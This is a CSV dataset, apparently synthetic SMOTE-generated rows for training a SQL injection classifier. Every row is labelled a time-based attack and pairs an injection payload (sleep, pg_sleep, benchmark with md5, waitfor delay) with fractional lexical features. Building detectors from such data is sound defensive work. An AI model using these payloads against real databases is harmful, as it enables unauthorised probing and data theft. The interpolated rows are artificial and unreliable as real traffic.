id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000428,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,1.6115643320920552,56.684402833354554,18.315597166645446,2.9914229866462096,17.89358299987268,1.0,27.737611333418215,10.05320850006366,0.31609767721148807,0.017642730941931542,0.4890965425556254,0.17716304929095505,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.684402833354554,0.6844028333545533,0.6844028333545533,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3155971666454467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3155971666454467
SMOTE_000429,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.6570625562162196,77.22720429563105,21.545591408737884,3.2584167177520373,14.88639785218447,18.0,34.454408591262116,9.886397852184471,0.1928069324648592,0.2330939212031302,0.4460405253124654,0.12805862101954524,0.0,0.0,1.7727957043689415,0.0,0.0,2.0,0.0,5.113602147815529,0.0,0.0,1.0,3.7727957043689413,0.0,0.0,0.8863978521844708,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8863978521844706,0.0,0.22720429563105832,0.8863978521844708,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000430,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000017,0.4525399905910783,82.88420230047693,24.884202300476925,3.229580929416297,30.0,2.0,39.0,11.884202300476925,0.3619562049641041,0.024130413664273598,0.4705430664533353,0.14337031491828703,0.11579769952307561,0.8842023004769244,0.0,0.0,1.0,0.0,0.0,8.0,0.8842023004769244,0.0,0.0,1.0,0.11579769952307561,0.8842023004769244,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000431,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,1.3381755967957345,59.63696742322523,23.62329036811068,3.547679087774167,18.0,10.0,24.26025779133591,7.376709631889319,0.3027781212669808,0.16821006737054486,0.4053786762048223,0.12363313515765201,0.3767096318893185,0.6232903681106816,2.0,0.0,0.0,1.0,0.0,3.3767096318893186,0.0,0.0,0.0,3.0,0.37670963188931833,0.6232903681106816,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000432,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,1.076091568910651,66.06150571463371,22.0,3.3823127852199173,17.22693535701236,12.061505714633705,28.515376428658428,8.257688214329214,0.2624602343718282,0.18040827009336374,0.43213149553480806,0.125,0.0,0.7423117856707868,2.0,0.0,0.0,1.2576882143292132,0.0,4.0,0.0,0.0,0.2576882143292132,3.257688214329213,0.0,0.7423117856707868,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000013,0.13206400252283884,90.07428017469971,22.074280174699705,3.006107557352871,28.29712069879882,1.0,45.85143965060059,14.925719825300295,0.31405746929513767,0.01110223653826764,0.5091054576484906,0.16573483651810406,3.0,0.0,0.0,0.0,1.0,0.975239941766765,0.0,8.975239941766764,0.975239941766765,0.0,0.0,1.975239941766765,1.0,0.0,0.0,0.0,0.0,0.975239941766765,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000434,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.2043739225288945,72.78646086752289,24.310768112538142,3.5620729429097553,16.73784637749237,19.524307245015258,28.0,8.524307245015256,0.23013983415399292,0.2681124750292896,0.38481094364988133,0.11693674716683618,0.0,0.26215362250762825,0.0,0.0,0.0,1.0,0.0,5.0,0.2621536225076283,0.0,1.0,1.0,0.0,0.2621536225076283,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.26215362250762836,0.7378463774923718,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000043,1.2219213652386465,89.45585477366322,27.735993084460155,3.840570132042917,19.735993084460155,27.887944675681226,31.623937760141377,10.20797925338046,0.22273147191329304,0.3109074112346828,0.3525995768006944,0.11376154005132977,0.7359930844601532,0.0,2.0,0.0,0.0,1.7359930844601532,0.0,4.735993084460153,0.0,0.0,1.0,3.735993084460153,0.7359930844601532,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.7359930844601532,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.735993084460153
SMOTE_000436,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,1.6057064012683122,58.625360253296165,18.0,2.843054978805048,15.303417034301642,1.2321943218994527,30.625360253296165,11.464388643798904,0.2626888725061554,0.020726347613753457,0.5212472826459136,0.19533749723417754,2.303417034301644,0.9287772875978083,0.0,0.0,0.0,1.0,0.0,5.232194321899452,1.2321943218994522,0.7678056781005478,0.0,1.0,0.7678056781005478,0.23219432189945205,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7678056781005478,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23219432189945205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000437,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000038,0.33464303000558243,80.43680910508309,21.079822728060172,3.029545198620899,28.0,2.0,40.1175181928424,10.319290912240685,0.34918039215159513,0.02494145658225677,0.49787920946578484,0.12799894180036323,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.239468184180513,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.07982272806017132,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000438,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,0.017727787722585892,58.96261639979847,20.02803770015115,3.4521225979723966,23.0,3.0093459000503833,21.953270499748086,11.0,0.3900954769813976,0.05105194419216555,0.37228517679185535,0.18656740203458147,5.009345900050382,0.0,0.0,0.0,0.0,1.0,0.0,2.990654099949617,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000439,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,0.4360030733090549,56.249441176159934,19.332588234879907,3.241943104264352,21.916852941280023,1.7483235284797924,24.75055882384007,7.833705882560046,0.38978694274702264,0.030465095768374237,0.4403133367830041,0.139434624701599,2.8337058825600465,0.0,0.0,0.0,0.0,1.0,0.0,3.916852941280023,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.08314705871997696,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.916852941280023,0.0,0.08314705871997696,0.0,0.916852941280023,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9168529412800233
SMOTE_000440,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000008,0.01680117549834875,59.01340475968367,22.991063493544225,3.6228814849069857,20.986595240316337,10.0,22.026809519367326,6.0,0.3556390429812212,0.16945488037265263,0.37323314842253463,0.10167292822359159,0.9955317467721126,0.0,0.0,0.0,0.0,1.0,0.0,3.0044682532278877,0.0,0.0,0.0,1.0,0.9955317467721126,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.004468253227887353,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0044682532278877
SMOTE_000441,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,2.366075094504895,76.1763836740768,25.66041595555593,3.630871186899649,28.302079777779642,10.0,29.213887940741238,8.660415955555928,0.36479023115849585,0.13412720989448254,0.3878863497469777,0.11319620920004392,0.0,2.6604159555559286,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5534719851853098,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5534719851853094
SMOTE_000442,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000049,0.325999989033194,78.38777996412156,27.0,3.73492931676241,23.581669946182345,14.757637522424023,29.09694499103039,10.951527504484805,0.30030580152466113,0.18862239524258356,0.37124569027144383,0.1398261129613115,0.0,3.0484724955151954,0.0,0.0,0.0,1.0,0.0,4.951527504484805,0.9515275044848048,0.04847249551519525,0.9515275044848046,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9515275044848048,0.0,1.0,0.0,0.0,0.048472495515195224,1.0484724955151954,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9515275044848048,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0484724955151954
SMOTE_000443,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,1.5583986465328261,64.0,23.43873938230167,3.4607069565877446,18.731232303836116,10.0,26.976274774629434,8.292492921534446,0.2926755047474393,0.15625,0.4215042933535849,0.12957020189897572,1.292492921534447,0.0,1.7075070784655533,0.0,0.0,1.0,0.0,3.853753539232777,0.0,0.0,0.0,3.0,1.0,0.0,0.8537535392327766,0.14624646076722359,0.0,1.0,1.0,0.0,0.0,0.0,0.14624646076722353,0.14624646076722359,0.0,1.0,0.0,0.14624646076722353,0.8537535392327765,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1462464607672236
SMOTE_000444,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,0.43795168366100096,62.143857728896535,19.35964432224133,3.22644450769292,25.568426813310406,1.6473597800343907,27.0,7.928071135551734,0.4116688915004878,0.02620777435313401,0.4345050003326093,0.12761833381376897,0.0,2.8561422711034687,0.0,0.0,0.0,0.07192886444826563,0.0,4.928071135551734,0.0,0.07192886444826563,0.0,0.07192886444826585,0.0,1.0,0.0,0.0,0.0,0.07192886444826563,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.07192886444826568,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9280711355517344,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000445,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,1.629834160591414,84.41650041918236,19.284708368265196,2.8213844594777697,12.927062552397794,15.138833473060787,45.70825020959118,10.642354184132598,0.15371447896282406,0.1761593432210333,0.5423160742610038,0.1278101035551388,0.0,0.0,0.0,0.0,0.0,1.6423541841325986,0.0,7.642354184132598,0.0,0.0,1.0,1.6423541841325984,0.0,0.0,0.0,0.35764581586740163,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6423541841325986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.642354184132598
SMOTE_000446,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,0.8148956676193205,69.45026927999545,21.817876377142532,3.3947827784363063,15.0,16.54301101714026,29.089381885712662,8.817876377142532,0.21749184885059103,0.23586971891623099,0.41928338538588317,0.12735504684729484,0.0,0.0,2.0,0.0,0.0,1.8178763771425328,0.0,4.0,0.0,0.0,1.0,3.817876377142533,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8178763771425327,0.0,0.1821236228574673,0.8178763771425327,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.817876377142533
SMOTE_000447,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,1.005851908157406,64.46618706505735,23.0,3.4853715767120295,19.0,10.0,27.0,8.466187065057358,0.29478448004002694,0.15514972633685628,0.41890426110951196,0.13116153251360488,0.0,1.0,1.4661870650573574,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,2.4661870650573574,0.0,1.0,0.7330935325286787,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000448,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,0.9186111784688876,77.92535326984894,18.614083845800607,3.0416027755403485,14.153520961450152,18.0,36.771832308398785,9.0,0.1819924771759277,0.23124888205744007,0.47113419973791215,0.11562444102872003,0.0,0.0,0.30704192290030385,0.0,0.0,2.0,0.0,5.692958077099696,0.0,0.0,1.0,2.3070419229003036,0.0,0.0,0.15352096145015193,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1535209614501519,0.0,1.6929580770996964,0.15352096145015193,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000449,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000075,2.04405616091859,83.56470193907774,24.652100277011105,3.6121374118481535,19.753500461685178,23.40560073869628,31.304200554022213,9.10140018467407,0.23635784054316175,0.27844592537987684,0.37605895842225545,0.10913727565470596,0.5507000923370352,0.0,0.0,0.0,0.0,1.5507000923370353,0.0,5.0,0.0,0.0,1.0,1.550700092337035,0.5507000923370353,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5507000923370352,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5507000923370353
SMOTE_000450,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.42548989225378814,84.83423612851433,27.83423612851434,3.6896791256239845,24.83423612851434,18.0,33.0,9.0,0.29272467334886,0.212182597995342,0.389001429658127,0.106091298997671,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.8342361285143407,0.16576387148565921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000451,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,1.5027622932934093,89.68576726149763,20.312100137268686,2.855965030101815,27.437366712422893,2.0,47.37366712422895,12.87473342484579,0.3070965988933587,0.022413901015832696,0.5269882236365775,0.14350127645423105,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.87473342484579,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.43736671242289504,0.562633287577105,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000452,attack,time,"1"" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000060,2.2343772977892336,88.0,27.541399890042854,3.875768166734885,21.082799780085708,27.917200219914292,30.0,9.0,0.23957727022824665,0.31724091158993517,0.3409090909090909,0.10227272727272728,0.0,0.5413998900428535,0.917200219914293,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.9172002199142932,0.0,0.5413998900428534,0.4586001099571465,0.5413998900428536,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000453,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,0.3878536473500141,89.0,27.836557875868213,3.862363696489296,25.754836813802317,22.081721062065895,30.40860531032947,10.754836813802319,0.2893801889191272,0.2481092254164707,0.34166972258797157,0.12084086307643055,3.6731157517364257,0.0,0.0,0.0,0.0,1.9182789379341063,0.0,4.163442124131787,0.0,0.0,1.0,1.9182789379341063,0.9182789379341063,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0817210620658938,0.0,0.0,0.0,1.9182789379341063,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000454,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000013,0.6814859650098566,91.17190530886307,22.260423401969575,2.982098693613356,28.260423401969575,1.1302117009847858,46.911481906893506,14.869788299015212,0.3100588953455775,0.012294853847336432,0.514267758407712,0.16337849239937408,2.7395765980304265,0.0,0.0,0.0,1.0,0.8697882990152132,0.0,9.260423401969573,0.8697882990152132,0.0,0.0,1.869788299015213,1.0,0.0,0.0,0.13021170098478682,0.0,0.8697882990152132,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8697882990152132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.869788299015213
SMOTE_000455,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000067,0.3379861485123901,62.90485084456928,18.71455253370785,3.1453460027534588,25.619403378277134,1.0,28.190298310861436,8.095149155430716,0.4071931108224931,0.01589737561582967,0.4481958448377702,0.12871366872390705,0.0,3.0,0.0,0.0,0.0,0.095149155430717,0.0,5.0,0.0,0.0,0.0,0.09514915543071689,0.0,1.0,0.0,0.0,0.0,0.09514915543071689,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000456,attack,time,1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000019,2.630657734374102,66.80042183743316,28.0,4.254965502399237,30.60084367486631,7.949050865775398,15.350316378074869,12.900210918716578,0.4567320957091673,0.12108879469926488,0.229334372096054,0.1928447374955139,4.549894540641711,0.0,2.0,0.0,0.0,0.5498945406417108,0.0,1.450105459358289,0.0,0.4501054593582891,0.45010545935828916,4.0,1.0,0.0,1.0,0.0,0.0,0.5498945406417108,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5498945406417108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5498945406417106
SMOTE_000457,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000016,0.0,55.0,23.0,3.794790516941512,23.0,4.0,17.0,11.0,0.41818181818181815,0.07272727272727272,0.3090909090909091,0.2,6.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000458,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,2.6196162554266316,75.12371586420518,25.51687034511889,3.6163395940526235,27.58435172559444,10.0,29.02249379349185,8.516870345118889,0.3602696571863991,0.13603976042113883,0.39082472282884057,0.11286585956362147,0.0,2.5168703451188885,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.5056234483729627,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5056234483729627
